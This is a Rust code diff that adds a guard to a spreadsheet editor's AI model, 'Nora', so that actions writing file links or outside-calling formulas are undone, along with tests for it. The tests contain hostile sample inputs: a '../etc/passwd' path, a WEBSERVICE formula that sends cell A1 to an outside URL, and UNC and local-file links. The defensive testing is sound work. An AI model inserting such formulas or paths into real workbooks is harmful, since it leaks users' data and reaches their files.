@@ -31,6 +31,15 @@
 //! What the person is typing is entered before any action. An action that fails leaves the workbook as
 //! it was, its history included. What Nora changed is undone a whole action at a time, and only while
 //! it is still the newest thing in the workbook: the pane never takes back the person's own work.
+//!
+//! Once an action changed the workbook, what it really wrote is read ([`guard`]): a link to a file, a
+//! formula that calls outside the workbook or reads another file, which the server could not see in
+//! what Nora asked for, takes the whole action back, and Nora is told why.
+//!
+//! The page that hosts the editor names the file it opened (the Drive's file id, [`name_file`]): Nora
+//! is told it with each message, and the server reads it again under the person's rights.
+
+mod guard;
 
 use std::sync::{Arc, Weak};
 
@@ -71,6 +80,9 @@ const MAX_BATCH: usize = 200;
 
 /// Nora's changes kept for Undo, as many as a workbook keeps undo steps.
 const MAX_CHANGES: usize = 100;
+
+/// The files the hosting page named that are remembered, the oldest forgotten beyond.
+const MAX_NAMED_FILES: usize = 32;
 
 /// Parameter names that would reach a file of the computer. A command given one is refused.
 const FILE_KEYS: &[&str] = &["path", "paths", "file", "files", "filename", "folder", "directory", "dir"];
@@ -159,14 +171,35 @@ pub struct NoraState {
     panel: NoraPanel,
     /// Nora's changes that Undo can take back, the newest last.
     changes: Vec<Change>,
+    /// The file each workbook is, by its uid, as the page that hosts the editor named it ([`name_file`]).
+    files: Vec<(u64, String)>,
 }
 
 impl Default for NoraState {
     fn default() -> Self {
         let context = PageContext::editor(AppKind::Sheet, DocumentInfo::named(""));
         let config = SessionConfig { policy: policy(), ..SessionConfig::default() };
-        NoraState { session: NoraSession::new(config, context), panel: NoraPanel::new(), changes: Vec::new() }
+        NoraState { session: NoraSession::new(config, context), panel: NoraPanel::new(), changes: Vec::new(), files: Vec::new() }
     }
+}
+
+/// The page that hosts the editor says which of its files workbook `uid` is (`id`, the Drive's file id
+/// sent with the file), or that it names none. Nora is told the id with each message about that
+/// workbook ([`DocumentInfo::file_id`] keeps only what reads as one); the server never believes it as it
+/// comes, it reads the file again under the person's rights. A host that names no file changes nothing.
+pub fn name_file(app: &mut SheetApp, uid: u64, id: Option<&str>) {
+    let files = &mut app.nora.files;
+    files.retain(|(named, _)| *named != uid);
+    if let Some(id) = id.and_then(DocumentInfo::file_id) {
+        files.push((uid, id));
+        let excess = files.len().saturating_sub(MAX_NAMED_FILES);
+        files.drain(..excess);
+    }
+}
+
+/// The file the hosting page named workbook `uid` ([`name_file`]), if it named one.
+pub fn named_file(app: &SheetApp, uid: u64) -> Option<&str> {
+    app.nora.files.iter().find(|(named, _)| *named == uid).map(|(_, id)| id.as_str())
 }
 
 /// One change of Nora's: the workbook it was made in, and the undo steps it took there, oldest first
@@ -298,6 +331,12 @@ fn run_document(app: &mut SheetApp, kind: &DocActionKind) -> Result<Json, String
             if steps.is_empty() && after == snapshot.revision {
                 return Ok(unchanged(result));
             }
+            // What the action really wrote: a link or a formula that leads outside the workbook takes it all back.
+            let written = app.session.documents().iter().find(|d| d.uid == snapshot.uid).map(|d| guard::added(&snapshot.wb, &d.wb));
+            if let Some(found) = written.filter(|found| !found.is_empty()) {
+                snapshot.restore(app);
+                return Err(guard::refusal(&what_ran(kind), &found));
+            }
             app.nora.changes.push(Change { doc: snapshot.uid, steps, before: snapshot.revision, after });
             let excess = app.nora.changes.len().saturating_sub(MAX_CHANGES);
             app.nora.changes.drain(..excess);
@@ -307,6 +346,16 @@ fn run_document(app: &mut SheetApp, kind: &DocActionKind) -> Result<Json, String
             snapshot.restore(app);
             Err(error)
         }
+    }
+}
+
+/// How Nora is told which of her actions was taken back.
+fn what_ran(kind: &DocActionKind) -> String {
+    match kind {
+        DocActionKind::Execute { command, .. } => format!("`{command}`"),
+        DocActionKind::Batch { .. } => "The batch".to_string(),
+        DocActionKind::TypeText { .. } => "The typed text".to_string(),
+        _ => "The action".to_string(),
     }
 }
 
@@ -807,7 +856,8 @@ fn cut_value(value: Json) -> Json {
 fn context_of(app: &SheetApp) -> PageContext {
     let Some(d) = app.session.active() else { return PageContext::editor(AppKind::Sheet, DocumentInfo::named("")) };
     let selection = d.wb.active().map(|sh| Selection { text: selection_text(d, sh) });
-    PageContext::editor(AppKind::Sheet, DocumentInfo { name: d.display_title(), id: None, pages: None, selection })
+    let id = named_file(app, d.uid).map(str::to_string);
+    PageContext::editor(AppKind::Sheet, DocumentInfo { name: d.display_title(), id, pages: None, selection })
 }
 
 fn selection_text(d: &DocState, sh: &Sheet) -> String {
@@ -1901,5 +1951,79 @@ mod tests {
         assert!(handed.lock().unwrap_or_else(|e| e.into_inner()).is_empty(), "nothing went to the page");
         assert_eq!(a.notice.as_ref().map(|n| n.text.as_str()), Some(crate::hosted::SAVE_IN_CLEAR_REFUSED));
         assert!(a.session.active().is_some_and(|d| d.is_dirty()), "the change stays unsaved");
+    }
+
+    /// The page that hosts the editor names the file a workbook is: Nora is told its id with each message about that
+    /// workbook and no other, and what does not read as an id is never passed on.
+    #[test]
+    fn the_context_carries_the_file_the_page_named() {
+        let mut a = app(Services::default());
+        let uid = a.session.active().unwrap().uid;
+        assert_eq!(context_of(&a).document.id, None, "nothing named, nothing told");
+        name_file(&mut a, uid, Some("3fcaa7893c"));
+        assert_eq!(context_of(&a).document.id.as_deref(), Some("3fcaa7893c"));
+        let value: Json = serde_json::from_str(&context_of(&a).to_json_string()).unwrap();
+        assert_eq!(value["document"]["id"], "3fcaa7893c", "{value}");
+        a.session.new_workbook();
+        assert_eq!(context_of(&a).document.id, None, "another workbook is no file of the page's");
+        a.session.set_active(0);
+        assert_eq!(context_of(&a).document.id.as_deref(), Some("3fcaa7893c"));
+        name_file(&mut a, uid, Some("../etc/passwd"));
+        assert_eq!(context_of(&a).document.id, None, "what is no id is not passed on, and the last one is forgotten");
+        name_file(&mut a, uid, Some("abc"));
+        name_file(&mut a, uid, None);
+        assert_eq!(context_of(&a).document.id, None, "a file the page names no more");
+        for at in 0..(MAX_NAMED_FILES as u64 + 5) {
+            name_file(&mut a, 1_000 + at, Some("x"));
+        }
+        assert_eq!(a.nora.files.len(), MAX_NAMED_FILES);
+    }
+
+    /// A change of Nora's that leaves a link to a file, or a formula that calls outside the workbook, is taken back
+    /// whole, and her answer says why; a link to a web page stays.
+    #[test]
+    fn a_change_that_leads_outside_the_workbook_is_taken_back_and_said() {
+        let mut a = app(Services::default());
+        set(&mut a, "A1", "Prix");
+        let workbook = a.session.active().unwrap().wb.clone();
+        let kept = history(&a);
+        let error = execute(&mut a, "cell.set", json!({"cell": "B2", "input": "=HYPERLINK(\"C:\\Tarifs\\x.pdf\",\"Tarifs\")"})).unwrap_err();
+        assert!(error.starts_with("`cell.set` was undone"), "{error}");
+        assert!(error.contains("a HYPERLINK formula to C:\\Tarifs\\x.pdf (Sheet1!B2)"), "{error}");
+        assert!(Arc::ptr_eq(&a.session.active().unwrap().wb, &workbook), "the workbook is the one before");
+        assert_eq!(history(&a), kept, "and so is its history");
+        assert!(a.nora.changes.is_empty(), "nothing of Nora's to undo");
+
+        let error = execute(&mut a, "insert.link", json!({"cell": "C3", "target": "\\\\srv\\share\\x.xlsx"})).unwrap_err();
+        assert!(error.contains("a link to \\\\srv\\share\\x.xlsx (Sheet1!C3)"), "{error}");
+
+        let typed = DocActionKind::TypeText { text: "Flux\t=WEBSERVICE(\"https://example.com/?\"&A1)".into(), paragraphs: false };
+        let error = run(&mut a, typed).unwrap_err();
+        assert!(error.starts_with("The typed text was undone"), "{error}");
+        assert!(error.contains("WEBSERVICE, which calls outside the workbook"), "{error}");
+
+        let batch = vec![
+            call("cell.set", json!({"cell": "D1", "input": "1"})),
+            call("cell.set", json!({"cell": "D2", "input": "=IMAGE(\"https://example.com/x.png\")"})),
+        ];
+        let error = run(&mut a, DocActionKind::Batch { commands: batch }).unwrap_err();
+        assert!(error.starts_with("The batch was undone"), "{error}");
+        assert!(Arc::ptr_eq(&a.session.active().unwrap().wb, &workbook), "the whole batch is taken back");
+
+        execute(&mut a, "cell.set", json!({"cell": "B2", "input": "=HYPERLINK(\"https://example.com\",\"Site\")"})).unwrap();
+        execute(&mut a, "insert.link", json!({"cell": "C3", "target": "mailto:info@example.com"})).unwrap();
+        assert_eq!(a.nora.changes.len(), 2, "a web page and an address stay");
+    }
+
+    /// A replace composes a link of its own: the server could not see it in what Nora asked, the pane reads it.
+    #[test]
+    fn a_link_a_command_composes_is_read_once_written() {
+        let mut a = app(Services::default());
+        set(&mut a, "A1", "=HYPERLINK(\"https://example.com/tarifs.pdf\",\"Tarifs\")");
+        let error = execute(&mut a, "edit.replace", json!({"what": "https://example.com/", "with": "C:\\", "all": true})).unwrap_err();
+        assert!(error.contains("C:\\tarifs.pdf"), "{error}");
+        // The person's own link to a file stays where it is when Nora works around it.
+        set(&mut a, "A5", "=HYPERLINK(\"C:\\x.pdf\")");
+        execute(&mut a, "cell.set", json!({"cell": "B1", "input": "5"})).unwrap();
     }
 }
